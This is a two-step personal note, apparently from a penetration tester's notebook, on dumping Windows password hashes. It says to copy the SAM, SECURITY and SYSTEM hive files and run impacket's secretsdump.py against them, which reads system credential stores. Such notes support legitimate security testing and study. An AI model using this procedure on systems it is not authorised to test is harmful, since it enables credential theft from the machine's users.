---
title: HASH dump and crack
updated: 2023-10-12 14:31:19Z
created: 2023-10-12 14:29:31Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1. Copy **SAM,** **SECURITY** and **SYSTEM** files from **c:\windows\system32\config**

2. run `/opt/impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM local`